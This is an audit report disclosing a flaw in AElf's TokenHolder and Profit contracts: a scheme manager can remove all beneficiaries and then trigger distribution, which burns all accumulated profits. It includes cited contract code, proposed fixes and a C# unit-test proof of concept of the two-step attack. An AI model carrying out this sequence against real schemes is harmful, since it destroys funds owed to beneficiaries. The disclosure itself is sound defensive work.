# Audit Report

## Title
Scheme Manager Can Permanently Destroy All Accumulated Profits by Removing Beneficiaries Before Distribution

## Summary
A malicious TokenHolder scheme manager can exploit the profit distribution system to permanently destroy all accumulated profits by removing all beneficiaries before calling `DistributeProfits`. When distribution occurs with zero total shares, the system automatically burns the funds instead of distributing them, resulting in complete and irreversible loss of assets that legitimate beneficiaries were entitled to claim.

## Finding Description

TokenHolder schemes are created with `CanRemoveBeneficiaryDirectly = true` by default, granting the scheme manager unrestricted ability to remove beneficiaries at any time. [1](#0-0) 

The scheme manager (validated as the scheme creator) can call `RemoveBeneficiary` to remove any beneficiary from the scheme. [2](#0-1) 

Each removal is forwarded to the underlying Profit contract, which subtracts the removed beneficiary's shares from the scheme's `TotalShares`. [3](#0-2) 

When `CanRemoveBeneficiaryDirectly` is true, the `RemoveProfitDetails` function removes all beneficiary details without restrictions. [4](#0-3) 

The critical flaw occurs in `DistributeProfits`: when `totalShares <= 0`, the contract calls `BurnProfits` instead of distributing to beneficiaries. [5](#0-4) 

The `BurnProfits` function permanently destroys the tokens by transferring them to the contract and calling the Token contract's `Burn` method, with no recovery mechanism. [6](#0-5) 

The scheme manager has authorized access to both `RemoveBeneficiary` and `DistributeProfits` functions, enabling the complete attack sequence without external dependencies. [7](#0-6) 

## Impact Explanation

This vulnerability enables **complete and permanent destruction of accumulated profits** with the following consequences:

1. **Total Fund Loss**: All tokens accumulated in the scheme are burned, permanently reducing the token supply. This is confirmed by test validation showing supply reduction when profits are burned. [8](#0-7) 

2. **Beneficiary Impact**: Legitimate beneficiaries who staked tokens or registered for profit sharing lose their entire entitled distribution without any claim mechanism.

3. **No Recovery**: The burning operation is irreversible - there is no mechanism to restore burned tokens or compensate affected users.

4. **Protocol-Wide Impact**: The broader ecosystem suffers permanent token supply deflation, affecting all token holders and ecosystem participants.

This qualifies as **HIGH severity** because it results in direct, complete, and irreversible loss of user funds through a simple two-step attack requiring only manager privileges.

## Likelihood Explanation

The likelihood is assessed as **MEDIUM-to-HIGH** based on:

**Attacker Profile**: The attacker must be or compromise a TokenHolder scheme manager. In typical use cases, these are DApp operators managing staking rewards or dividend distributions, making insider threats realistic.

**Attack Complexity**: The attack is trivially simple:
- Step 1: Call `RemoveBeneficiary` for each beneficiary (can be batched)
- Step 2: Call `DistributeProfits`

**No Barriers**:
- No timelock between operations
- No governance approval required
- No minimum shares validation
- Can be executed in a single block
- Both functions are directly accessible to the manager

**Realistic Scenarios**:
- Compromised DApp operator credentials
- Malicious exit scam by scheme operators
- Insider attack from disgruntled administrators
- Financial incentive to harm competitors or users

**Detection Challenges**: The removal transactions appear legitimate and authorized. Without real-time monitoring of beneficiary counts before distribution, the attack is only detected after funds are destroyed.

## Recommendation

Implement multiple protective layers:

1. **Minimum Shares Validation**: Add a check in `DistributeProfits` to prevent distribution when `TotalShares` is zero (except for intentional burn scenarios):

```csharp
if (totalShares <= 0 && input.Period >= 0)
{
    Assert(false, "Cannot distribute with zero total shares. Add beneficiaries first.");
}
```

2. **Removal Restrictions**: Add a timelock mechanism between beneficiary removal and profit distribution:

```csharp
// In scheme state
public Timestamp LastBeneficiaryRemovalTime { get; set; }

// In RemoveBeneficiary
scheme.LastBeneficiaryRemovalTime = Context.CurrentBlockTime;

// In DistributeProfits
Assert(
    scheme.LastBeneficiaryRemovalTime.AddHours(24) < Context.CurrentBlockTime,
    "Must wait 24 hours after beneficiary removal before distribution."
);
```

3. **Governance Control**: For TokenHolder schemes, require beneficiary removal to go through a governance proposal when it would reduce shares below a threshold.

4. **Emergency Stop**: Implement a circuit breaker that prevents distribution if beneficiary count drops to zero within a recent time window.

## Proof of Concept

```csharp
[Fact]
public async Task TokenHolder_MaliciousManager_BurnsAllProfits_Test()
{
    // Setup: Create scheme and add beneficiaries
    var manager = Creators[0];
    await manager.CreateScheme.SendAsync(new CreateSchemeInput
    {
        Symbol = "ELF",
        MinimumLockMinutes = 100
    });
    
    var schemeAddress = Address.FromPublicKey(CreatorKeyPair[0].PublicKey);
    
    // Add two beneficiaries
    await manager.AddBeneficiary.SendAsync(new AddTokenHolderBeneficiaryInput
    {
        Beneficiary = Accounts[0].Address,
        Shares = 100
    });
    await manager.AddBeneficiary.SendAsync(new AddTokenHolderBeneficiaryInput
    {
        Beneficiary = Accounts[1].Address,
        Shares = 100
    });
    
    // Contribute profits
    await manager.ContributeProfits.SendAsync(new ContributeProfitsInput
    {
        SchemeManager = schemeAddress,
        Symbol = "ELF",
        Amount = 10000
    });
    
    // Record supply before attack
    var supplyBefore = (await TokenContractStub.GetTokenInfo.CallAsync(
        new GetTokenInfoInput { Symbol = "ELF" })).Supply;
    
    // ATTACK: Remove all beneficiaries
    await manager.RemoveBeneficiary.SendAsync(new RemoveTokenHolderBeneficiaryInput
    {
        Beneficiary = Accounts[0].Address,
        Amount = 0  // Remove completely
    });
    await manager.RemoveBeneficiary.SendAsync(new RemoveTokenHolderBeneficiaryInput
    {
        Beneficiary = Accounts[1].Address,
        Amount = 0
    });
    
    // ATTACK: Distribute with zero shares - burns all profits
    await manager.DistributeProfits.SendAsync(new DistributeProfitsInput
    {
        SchemeManager = schemeAddress
    });
    
    // Verify: Supply decreased by contributed amount (funds burned)
    var supplyAfter = (await TokenContractStub.GetTokenInfo.CallAsync(
        new GetTokenInfoInput { Symbol = "ELF" })).Supply;
    
    supplyBefore.Sub(supplyAfter).ShouldBe(10000);  // All profits burned
}
```

**Notes**

This vulnerability exploits a design assumption that scheme managers are always benevolent. While the delayed distribution test case demonstrates that burning with zero shares is expected behavior for specific scenarios, it was not designed to handle malicious removal of all beneficiaries. The lack of safeguards creates an easily exploitable attack vector with catastrophic consequences for legitimate users. The scheme manager role should be treated as a high-privilege position requiring additional security controls, particularly around operations that affect accumulated user funds.

### Citations

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L20-24)
```csharp
        State.ProfitContract.CreateScheme.Send(new CreateSchemeInput
        {
            Manager = Context.Sender,
            IsReleaseAllBalanceEveryTimeByDefault = true,
            CanRemoveBeneficiaryDirectly = true
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L70-84)
```csharp
    public override Empty RemoveBeneficiary(RemoveTokenHolderBeneficiaryInput input)
    {
        var scheme = GetValidScheme(Context.Sender);

        var detail = State.ProfitContract.GetProfitDetails.Call(new GetProfitDetailsInput
        {
            Beneficiary = input.Beneficiary,
            SchemeId = scheme.SchemeId
        }).Details.Single();
        var lockedAmount = detail.Shares;
        State.ProfitContract.RemoveBeneficiary.Send(new RemoveBeneficiaryInput
        {
            SchemeId = scheme.SchemeId,
            Beneficiary = input.Beneficiary
        });
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L131-135)
```csharp
    public override Empty DistributeProfits(DistributeProfitsInput input)
    {
        var scheme = GetValidScheme(input.SchemeManager, true);
        Assert(Context.Sender == Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName) ||
               Context.Sender == input.SchemeManager, "No permission to distribute profits.");
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L224-262)
```csharp
    public override Empty RemoveBeneficiary(RemoveBeneficiaryInput input)
    {
        Assert(input.SchemeId != null, "Invalid scheme id.");
        Assert(input.Beneficiary != null, "Invalid Beneficiary address.");

        var scheme = State.SchemeInfos[input.SchemeId];

        Assert(scheme != null, "Scheme not found.");

        var currentDetail = State.ProfitDetailsMap[input.SchemeId][input.Beneficiary];

        if (scheme == null || currentDetail == null) return new Empty();

        Assert(Context.Sender == scheme.Manager || Context.Sender ==
            Context.GetContractAddressByName(SmartContractConstants.TokenHolderContractSystemName),
            "Only manager or token holder contract can add beneficiary.");

        var removedDetails = RemoveProfitDetails(scheme, input.Beneficiary, input.ProfitDetailId);

        foreach (var (removedMinPeriod, removedShares) in removedDetails.Where(d => d.Key != 0))
        {
            if (scheme.DelayDistributePeriodCount > 0)
            {
                for (var removedPeriod = removedMinPeriod;
                     removedPeriod < removedMinPeriod.Add(scheme.DelayDistributePeriodCount);
                     removedPeriod++)
                {
                    if (scheme.CachedDelayTotalShares.ContainsKey(removedPeriod))
                    {
                        scheme.CachedDelayTotalShares[removedPeriod] =
                            scheme.CachedDelayTotalShares[removedPeriod].Sub(removedShares);
                    }
                }
            }
        }

        State.SchemeInfos[input.SchemeId].TotalShares = scheme.TotalShares.Sub(removedDetails.Values.Sum());

        return new Empty();
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L321-324)
```csharp
        var detailsCanBeRemoved = scheme.CanRemoveBeneficiaryDirectly
            ? profitDetails.Details.Where(d => !d.IsWeightRemoved).ToList()
            : profitDetails.Details
                .Where(d => d.EndPeriod < scheme.CurrentPeriod && !d.IsWeightRemoved).ToList();
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L485-486)
```csharp
        if (input.Period < 0 || totalShares <= 0)
            return BurnProfits(input.Period, profitsMap, scheme, profitsReceivingVirtualAddress);
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L546-550)
```csharp
                State.TokenContract.Burn.Send(new BurnInput
                {
                    Amount = amount,
                    Symbol = symbol
                });
```

**File:** test/AElf.Contracts.Profit.Tests/BVT/SchemeTests.cs (L85-94)
```csharp
        var supplyBeforeBurning = (await TokenContractStub.GetTokenInfo.CallAsync(new GetTokenInfoInput
        {
            Symbol = ProfitContractTestConstants.NativeTokenSymbol
        })).Supply;
        await ContributeAndDistribute(creator, contributeAmountEachTime, period);
        var supplyAfterBurning = (await TokenContractStub.GetTokenInfo.CallAsync(new GetTokenInfoInput
        {
            Symbol = ProfitContractTestConstants.NativeTokenSymbol
        })).Supply;
        supplyBeforeBurning.Sub(supplyAfterBurning).ShouldBe(contributeAmountEachTime);
```
